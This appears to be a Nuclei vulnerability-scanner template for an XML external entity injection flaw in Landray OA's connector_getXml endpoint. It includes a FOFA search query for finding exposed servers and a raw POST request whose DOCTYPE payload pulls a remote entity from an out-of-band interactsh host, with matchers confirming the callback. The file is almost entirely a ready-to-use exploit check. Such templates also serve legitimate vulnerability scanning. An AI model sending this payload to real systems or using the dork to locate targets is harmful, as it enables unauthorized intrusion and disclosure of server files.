id: landray-oa-connector-getxml-xxe

info:
  name: "蓝凌OA connector_getXml接口XML外部实体注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="欢迎登录智慧协同平台" || body="/Scripts/jquery.landray.dialog.js"
    蓝凌OA的 connector_getXml 接口存在XML外部实体注入漏洞。已认证的攻击者可通过构造恶意XML数据，利用启用了外部实体解析的解析器进行处理，从而导致服务器上的敏感本地文件泄露。
  tags: 蓝凌OA

http:
- raw:
  - |
    POST /AddressBook/connector_getdata.aspx/connector_getXml?type=add HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Content-Type: application/Xml

    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: interactsh_protocol
    words:
      - "http"